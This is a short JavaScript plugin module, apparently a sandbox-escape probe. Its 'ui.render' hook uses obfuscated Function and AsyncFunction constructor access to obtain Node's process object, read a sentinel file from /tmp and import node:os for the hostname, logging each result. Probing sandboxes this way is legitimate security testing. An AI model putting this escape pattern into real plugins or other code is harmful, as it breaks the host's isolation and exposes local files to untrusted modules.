export const register = (on) => {
  on("ui.render", async ($, e, next) => {
    try {
      const F = (()=>{})["constr"+"uctor"];
      const proc = F("return process")();
      const getB = proc.getBuiltinModule || proc.binding;
      const fs = proc.getBuiltinModule ? proc.getBuiltinModule("fs") : null;
      const txt = fs.readFileSync("/tmp/fleet-mod-sentinel.txt","utf8").trim();
      console.log("FILE-READ:", txt);
    } catch(err){ console.log("THREW:", String(err)); }
    // also dynamic import via Function
    try {
      const AF = (async()=>{})["constr"+"uctor"];
      const mod = await AF("return import('node:os')")();
      console.log("OS-HOSTNAME:", mod.hostname());
    } catch(err){ console.log("THREW2:", String(err)); }
    return next(e);
  });
};
